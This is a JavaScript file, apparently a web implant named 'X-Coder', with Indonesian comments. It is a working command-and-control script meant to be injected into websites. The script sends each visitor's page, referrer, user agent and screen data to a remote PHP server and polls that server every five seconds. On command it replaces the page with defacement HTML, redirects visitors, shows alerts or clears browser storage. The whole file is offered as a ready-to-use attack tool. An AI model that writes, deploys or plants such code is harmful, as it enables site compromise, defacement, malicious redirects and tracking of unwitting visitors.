/**
 * X-Coder System - SIMPLE VERSION
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // KIRIM DATA
    // ============================================================
    function sendData() {
        var formData = new FormData();
        formData.append('domain', getDomain());
        formData.append('path', window.location.pathname);
        formData.append('title', document.title);
        formData.append('referrer', document.referrer || 'Direct');
        formData.append('userAgent', navigator.userAgent);
        formData.append('screen', screen.width + 'x' + screen.height);
        
        fetch(SERVER, {
            method: 'POST',
            body: formData
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.command) {
                executeCommand(data.command, data);
            }
        })
        .catch(function() {});
    }

    // ============================================================
    // CEK PERINTAH
    // ============================================================
    function checkCommand() {
        var domain = getDomain();
        var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(domain);
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.command) {
                    executeCommand(data.command, data);
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1>HACKED</h1>';
                break;
            case 'alert':
                alert(data.message || 'Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    setTimeout(sendData, 1000);
    setInterval(sendData, 30000);
    setInterval(checkCommand, 5000);

    console.log('🔍 X-Coder started on:', getDomain());
})();
